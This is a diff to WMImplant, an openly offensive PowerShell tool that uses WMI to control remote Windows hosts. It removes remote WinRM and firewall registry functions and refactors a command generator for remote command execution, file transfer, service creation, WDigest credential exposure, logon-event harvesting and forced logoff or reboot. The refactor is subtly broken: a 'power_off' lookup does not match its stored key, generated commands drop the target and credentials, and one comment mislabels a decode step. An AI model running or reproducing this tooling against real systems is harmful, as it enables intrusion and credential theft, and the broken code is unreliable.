@@ -118,151 +118,12 @@ function Invoke-WMIObfuscatedPSCommand
     end{}
 } # End of Function block
 
-
-function Disable-WinRMWMI
-{
-    # This and the coupled enable function are no longer actually used, but are included in the event
-    # I find a specific usecase for this route in the future
-    param
-    (
-        [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
-        [Parameter(Mandatory = $False)]
-        [string]$Target
-    )
-
-    Begin
-    {
-        $HKLM = 2147483650
-        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
-        $DWORDName = 'AllowAutoConfig' 
-        $DWORDvalue = '0x1'
-    }
-
-    Process
-    {
-        if(!$Target)
-        {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
-        }
-
-        Write-Verbose 'Attempting to create Remote Key and set value'
-        if($Creds)
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
-        }
-        else 
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
-        }
-
-        Write-Verbose 'Attempting to stop WinRM'
-        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StopService() | Out-Null
-        Start-Sleep -Seconds 10
-
-        # Variables for WinRM Firewall Rule
-        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
-        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
-        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
-        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
-        $Rule2Name = 'WINRM-HTTP-In-TCP'
-
-        if($Creds)
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
-        }
-        else 
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name DeleteKey -ArgumentList $HKLM, $Key -ComputerName $Target
-        }        
-    }
-}
-
-function Enable-WinRMWMI
-{
-    # This and the coupled disable function are no longer actually used, but are included in the event
-    # I find a specific usecase for this route in the future
-    param
-    (
-        [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
-        [Parameter(Mandatory = $False)]
-        [string]$Target
-    )
-
-    Begin
-    {
-        $HKLM = 2147483650
-        $Key = 'SOFTWARE\Policies\Microsoft\Windows\WinRM\Service'
-        $DWORDName = 'AllowAutoConfig' 
-        $DWORDvalue = '0x1'
-    }
-
-    Process
-    {
-        if(!$Target)
-        {
-            $Target = Read-Host "What system are you targeting? >"
-            $Target = $Target.Trim()
-        }
-
-        # This code was found online as separate functions and combined into a single
-        # function where appropriate
-        # Enabling WinRM Service
-        Write-Verbose 'Attempting to create Remote Key and set value'
-        if($Creds)
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
-            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $DWORDName -RegValue 1 -Target $Target -Creds $Creds
-        }
-        else 
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
-            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $DWORDName -RegValue 1 -Target $Target
-        }
-
-        Write-Verbose 'Attempting to start WinRM'
-        (Get-WmiObject win32_service -Filter "Name='WinRM'" -ComputerName $Target).StartService() | Out-Null
-        Start-Sleep -Seconds 10
-
-        # Variables for WinRM Firewall Rule
-        $Key = 'SOFTWARE\Policies\Microsoft\WindowsFirewall\FirewallRules'
-        $Rule1Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Public|LPort=5985|RA4=LocalSubnet|RA6=LocalSubnet|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
-        $Rule1Name = 'WINRM-HTTP-In-TCP-PUBLIC'
-        $Rule2Value = 'v2.20|Action=Allow|Active=TRUE|Dir=In|Protocol=6|Profile=Domain|Profile=Private|LPort=5985|App=System|Name=@FirewallAPI.dll,-30253|Desc=@FirewallAPI.dll,-30256|EmbedCtxt=@FirewallAPI.dll,-30267|'
-        $Rule2Name = 'WINRM-HTTP-In-TCP'
-
-        if($Creds)
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target -Credential $Creds
-            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule1Name -RegValue $Rule1Value -Target $Target -Creds $Creds
-            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule2Name -RegValue $Rule2Value -Target $Target -Creds $Creds
-        }
-        else 
-        {
-            Invoke-WmiMethod -Class StdRegProv -Name CreateKey -ArgumentList $HKLM, $Key -ComputerName $Target
-            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule1Name -RegValue $Rule1Value -Target $Target
-            Invoke-RegValueMod -KeyCreate -RegHive hklm -RegKey $Key -RegSubKey $Rule2Name -RegValue $Rule2Value -Target $Target
-        }
-
-        # Restarting firewall service
-        Write-Verbose 'Attempting to stop MpsSvc'
-        $null = (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StopService()
-        Start-Sleep -Seconds 10
-        Write-Verbose 'Attempting to start MpsSvc'
-        $null = (Get-WmiObject win32_service -Filter "Name='MpsSvc'" -ComputerName $Target).StartService()
-        Start-Sleep -Seconds 10
-    }
-}
-
 function Find-CurrentUsers
 {
-    # This function list user accounts with active processes
-    # on the targeted system
+    <# This function list user accounts with active processes
+     on the targeted system #>
     param
     (
-        #Parameter assignment
         [Parameter(Mandatory = $False)]
         [System.Management.Automation.PSCredential]$Creds,
         [Parameter(Mandatory = $False)]
@@ -542,6 +403,7 @@ function Get-InstalledPrograms
             }
         }
     
+        # This is the encoding routine which encodes data in a Device Guard compliant manner
         $decode = [char[]][int[]]$modified_WMIObject.DebugFilePath.Split(',') -Join ''
         # Print to console
         $decode
@@ -675,16 +537,16 @@ Path to save output to
 
         if($Creds)
         {
-            $temp = Get-WmiObject -Credential $Creds -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
+            $results = Get-WmiObject -Credential $Creds -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
         }
 
         else
         {
-            $temp = Get-WmiObject -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
+            $results = Get-WmiObject -computername $Target -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
         }
 
         $temp2 = @()
-        ForEach ($line in $temp)
+        ForEach ($line in $results)
         {
             $temp2 += $line.Message -split '[\r\n]' | Select-String -pattern "workstation name:", "account name:", "source network address:"
         }
@@ -704,7 +566,7 @@ Path to save output to
 
         if($FileName)
         {
-            $temp | Out-File -Encoding ASCII -FilePath $FileName
+            $results | Out-File -Encoding ASCII -FilePath $FileName
         }
     }
 }
@@ -837,6 +699,36 @@ function Invoke-CommandGeneration
         $GenPassword = Read-Host "Please provide the password to use for authentication >"
     }
 
+    # hashmap for command generation
+    $wmimplant_commands = @{"set_default" = "`nInvoke-WMImplant -SetWMIDefault";
+                            "cat" = "`nInvoke-WMImplant -Cat -RemoteFile ";
+                            "download" = "`nInvoke-WMImplant -Download ";
+                            "ls" = "`nInvoke-WMImplant -LS -RemoteDirectory ";
+                            "search" = "`nInvoke-WMImplant -Search ";
+                            "upload" = "`nInvoke-WMImplant -Upload -LocalFile ";
+                            "command_exec" = "`nInvoke-WMImplant -CommandExec -RemoteCommand ";
+                            "disable_wdigest" = "`nInvoke-WMImplant -DisableWdigest";
+                            "disable_winrm" = "`nInvoke-WMImplant -DisableWinRM";
+                            "enable_wdigest" = "`nInvoke-WMImplant -EnableWdigest";
+                            "enable_winrm" = "`nInvoke-WMImplant -EnableWinRM";
+                            "registry_mod" = "`nInvoke-WMImplant ";
+                            "remote_posh" = "`nInvoke-WMImplant -RemotePosh ";
+                            "service_mod" = "`nInvoke-WMImplant ";
+                            "process_kill" = "`nInvoke-WMImplant -ProcessKill ";
+                            "process_start" = "`nInvoke-WMImplant -ProcessStart -RemoteFile ";
+                            "ps" = "`nInvoke-WMImplant -PS";
+                            "active_users" = "`nInvoke-WMImplant -ActiveUsers";
+                            "basic_info" = "`nInvoke-WMImplant -BasicInfo";
+                            "drive_list" = "`nInvoke-WMImplant -DriveList";
+                            "ifconfig" = "`nInvoke-WMImplant -IFConfig";
+                            "installed_programs" = "`nInvoke-WMImplant -InstalledPrograms";
+                            "logon_events" = "`nInvoke-WMImplant -LogonEvents";
+                            "logoff" = "`nInvoke-WMImplant -LogOff";
+                            "reboot" = "`nInvoke-WMImplant -Reboot";
+                            "poweroff" = "`nInvoke-WMImplant -PowerOff";
+                            "vacant_system" = "`nInvoke-WMImplant -VacantSystem"
+                            }
+
     switch ($GenSelection)
     {
         "change_user"
@@ -856,15 +748,7 @@ function Invoke-CommandGeneration
 
         "set_default"
         {
-            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -SetWMIDefault -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-            else
-            {
-                $Command = "`nInvoke-WMImplant -SetWMIDefault -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("set_default")
         }
 
         "help"
@@ -874,18 +758,9 @@ function Invoke-CommandGeneration
 
         "cat"
         {
+            $Command = $wmimplant_commands.Get_Item("cat")
             $FileRead = Read-Host "What's the full path to the file you'd like to read? >"
-
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -Cat -Target $GenTarget -RemoteFile $FileRead -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -Cat -Target $GenTarget -RemoteFile $FileRead`n"
-            }
-            $Command
+            $Command += $FileRead
         }
 
         "download"
@@ -894,32 +769,15 @@ function Invoke-CommandGeneration
             $GenDownload = Read-Host "What is the full path to the file you want to download? >"
             $GenSavePath = Read-Host "What is the full path to where you'd like to save the file? >"
 
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -Download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -Download -RemoteFile $GenDownload -LocalFile $GenSavePath -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("download")
+            $Command += "-RemoteFile $GenDownload -LocalFile $GenSavePath"
         }
 
         "ls"
         {
             $DirLs = Read-Host "What is the full path to the directory you want to list? >"
-
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -LS -RemoteDirectory $DirLs -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -LS -RemoteDirectory $DirLs -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("ls")
+            $Command += "$DirLs"
         }
 
         "search"
@@ -928,121 +786,56 @@ function Invoke-CommandGeneration
             $SearchBy = $SearchBy.Trim().ToLower()
             $SearchDrive = Read-Host "What drive do you want to search? Ex C: >"
             $SearchDrive = $SearchDrive.Trim().ToLower()
+            $Command = $wmimplant_commands.Get_Item("search")
+            $Command += "-RemoteDrive $SearchDrive "
 
             if($SearchBy -eq "extension")
             {
                 $SearchExt = Read-Host "What is the file extension you are looking for? >"
                 $SearchExt = $SearchExt.Trim().ToLower()
-
-                if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                {
-                    $Command = "`nInvoke-WMImplant -Search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                }
-
-                else
-                {
-                    $Command = "`nInvoke-WMImplant -Search -RemoteExtension $SearchExt -RemoteDrive $SearchDrive -Target $GenTarget`n"
-                }
+                $Command += "-RemoteExtension $SearchExt"
             }
             else
             {
                 $SearchFile = Read-Host "What is the file name you are looking for? >"
                 $SearchFile = $SearchFile.Trim().ToLower()
-
-                if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                {
-                    $Command = "`nInvoke-WMImplant -Search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                }
-
-                else
-                {
-                    $Command = "`nInvoke-WMImplant -Search -RemoteFile $SearchFile -RemoteDrive $SearchDrive -Target $GenTarget`n"
-                }
+                $Command += "-RemoteFile $SearchFile"
             }
-            $Command
         }
 
         "upload"
         {
             $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
             $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"
-
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -Upload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -Upload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("upload")
+            $Command += "$FileToUpload -RemoteFile $UploadLocation"
         }
 
         "command_exec"
         {
             $GenCommandExec = Read-Host "What command do you want to run on the remote system? >"
-            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -CommandExec -RemoteCommand $GenCommandExec -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-            else
-            {
-                $Command = "`nInvoke-WMImplant -CommandExec -RemoteCommand $GenCommandExec -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("command_exec")
+            $Command += "`"$GenCommandExec`""
         }
 
         "disable_wdigest"
         {
-            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -DisableWdigest -KeyDelete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-            else
-            {
-                $Command = "`nInvoke-WMImplant -DisableWdigest -KeyDelete -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("disable_wdigest")
         }
 
         "disable_winrm"
         {
-            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -DisableWinRM -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-            else
-            {
-                $Command = "`nInvoke-WMImplant -DisableWinRM -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("disable_winrm")
         }
 
         "enable_wdigest"
         {
-            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -EnableWdigest -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-            else
-            {
-                $Command = "`nInvoke-WMImplant -EnableWdigest -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("enable_wdigest")
         }
 
         "enable_winrm"
         {
-            if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -EnableWinRM -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-            else
-            {
-                $Command = "`nInvoke-WMImplant -EnableWinRM -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("enable_winrm")
         }
 
         "registry_mod"
@@ -1052,53 +845,29 @@ function Invoke-CommandGeneration
             $GenRegHive = Read-Host "What hive would you like to modify? Ex: hklm >"
             $GenRegKey = Read-Host "What's the registry key you'd like to modify? Ex: SOFTWARE\Microsoft\Windows >"
             $GenRegValue = Read-Host "What's the registry subkey you'd like to modify? Ex: WMImplantInstalled >"
+            $Command = $wmimplant_commands.Get_Item("registry_mod")
 
             switch($GenRegMethod)
             {
                 "create"
                 {
                     $GenRegData = Read-Host "What's the data you'd like to modify? >"
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData -Target $GenTarget`n"
-                    }
+                    $Command += "-KeyCreate -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -RegValue $GenRegData"
                 }
 
                 "delete"
                 {
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue -Target $GenTarget`n"
-                    }
+                    $Command += "-KeyDelete -RegHive $GenRegHive -RegKey $GenRegKey -RegSubKey $GenRegValue"
                 }
             }
-            $Command
-
         }
 
         "remote_posh"
         {
             $PoshLocation = Read-Host "What's the file location where the PowerShell script you want to run is located? >"
             $PoshFunction = Read-Host "What's the PowerShell Function you'd like to call? >"
-
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -RemotePosh -Location $PoshLocation -Function $PoshFunction -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -RemotePosh -Location $PoshLocation -Function $PoshFunction -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("remote_posh")
+            $Command += "-Location $PoshLocation -Function $PoshFunction"
         }
 
         "service_mod"
@@ -1106,291 +875,125 @@ function Invoke-CommandGeneration
             $GenServiceAction = Read-Host "Do you want to [start], [stop], [create], or [delete] a service? >"
             $GenServiceAction = $GenServiceAction.Trim().ToLower()
             $GenServiceName = Read-Host "What is the name of the service? >"
+            $Command = $wmimplant_commands.Get_Item("service_mod")
+            $Command += "-ServiceName $GenServiceName "
 
             switch($GenServiceAction)
             {
                 "start"
                 {
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceStart -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceStart -ServiceName $GenServiceName -Target $GenTarget`n"
-                    }
+                    $Command += "-ServiceStart "
                 }
 
                 "stop"
                 {
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceStop -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceStop -ServiceName $GenServiceName -Target $GenTarget`n"
-                    }
+                    $Command += "-ServiceStop "
                 }
 
                 "delete"
                 {
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceDelete -ServiceName $GenServiceName -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceDelete -ServiceName $GenServiceName -Target $GenTarget`n"
-                    }
+                    $Command += "-ServiceDelete "
                 }
 
                 "create"
                 {
                     $GenServicePath = Read-Host "What's the full path to the binary that will be used by the service?"
-                    if(($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceCreate -ServiceName $GenServiceName -RemoteFile $GenServicePath -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ServiceCreate -ServiceName $GenServiceName -RemoteFile $GenServicePath -Target $GenTarget`n"
-                    }
+                    $Command += "-ServiceCreate -RemoteFile $GenServicePath"
                 }
             }
-            $Command
         }
 
         "process_kill"
         {
             $GenKillMethod = Read-Host "Do you want to kill a process by its [name] or [pid]? >"
             $GenKillMethod = $GenKillMethod.Trim().ToLower()
+            $Command = $wmimplant_commands.Get_Item("process_kill")
 
             switch($GenKillMethod)
             {
                 "name"
                 {
                     $GenProcName = Read-Host "What's the name of the process you want to kill? >"
-                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessName $GenProcName -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                    }
-
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessName $GenProcName -Target $GenTarget`n"
-                    }
+                    $Command += "-ProcessName $GenProcName"
                 }
 
                 "pid"
                 {
                     $GenProcID = Read-Host "What's the Process ID of the process you want to kill? >"
-                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -RemoteUser $GenUsername -RemotePass $GenPassword -Target $GenTarget`n"
-                    }
-
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -ProcessKill -ProcessID $GenProcID -Target $GenTarget`n"
-                    }
+                    $Command += "-ProcessID $GenProcID"
                 }
             }
-            $Command
         }
 
         "process_start"
         {
             $GenProcPath = Read-Host "What's the path to the binary you want to run? >"
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -ProcessStart -RemoteFile $GenProcPath -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -ProcessStart -RemoteFile $GenProcPath -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("process_start")
+            $Command += "$GenProcPath"
         }
 
         "ps"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -PS -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -PS -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("ps")
         }
 
         "active_users"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -ActiveUsers -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -ActiveUsers -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("active_users")
         }
 
         "basic_info"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -BasicInfo -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -BasicInfo -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("basic_info")
         }
 
         "drive_list"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -DriveList -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -DriveList -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("drive_list")
         }
 
         "ifconfig"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -IFConfig -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -IFConfig -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("ifconfig")
         }
 
         "installed_programs"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -InstalledPrograms -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -InstalledPrograms -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("installed_programs")
         }
 
         "logon_events"
         {
             $GenSaveFile = Read-Host "Do you want to save the log output to a file? [yes/no] >"
             $GenSaveFile = $GenSaveFile.Trim().ToLower()
+            $Command = $wmimplant_commands.Get_Item("logon_events")
 
-            switch($GenSaveFile)
+            if($GenSaveFile -eq "yes")
             {
-                "yes"
-                {
-                    $GenFileSave = Read-Host "What's the full path to where you'd like the output saved? >"
-                    $GenFileSave = $GenFileSave.Trim()
-
-                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword -LocalFile $GenFileSave`n"
-                    }
-
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget -LocalFile $GenFileSave`n"
-                    }
-                }
-
-                default
-                {
-                    if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-                    {
-                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-                    }
-
-                    else
-                    {
-                        $Command = "`nInvoke-WMImplant -LogonEvents -Target $GenTarget`n"
-                    }
-                }
+                $GenFileSave = Read-Host "What's the full path to where you'd like the output saved? >"
+                $GenFileSave = $GenFileSave.Trim()
+                $Command += " -LocalFile $GenFileSave"
             }
-            $Command
         }
 
         "logoff"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -LogOff -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -LogOff -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("logoff")
         }
 
         "reboot"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -Reboot -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -Reboot -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("reboot")
         }
 
         "power_off"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -PowerOff -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -PowerOff -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("power_off")
         }
 
         "vacant_system"
         {
-            if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
-            {
-                $Command = "`nInvoke-WMImplant -VacantSystem -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
-            }
-
-            else
-            {
-                $Command = "`nInvoke-WMImplant -VacantSystem -Target $GenTarget`n"
-            }
-            $Command
+            $Command = $wmimplant_commands.Get_Item("vacant_system")
         }
 
         default
@@ -1398,6 +1001,18 @@ function Invoke-CommandGeneration
             Write-Output "You did not select a valid command!  Please try again!"
         }
     } #End of switch
+
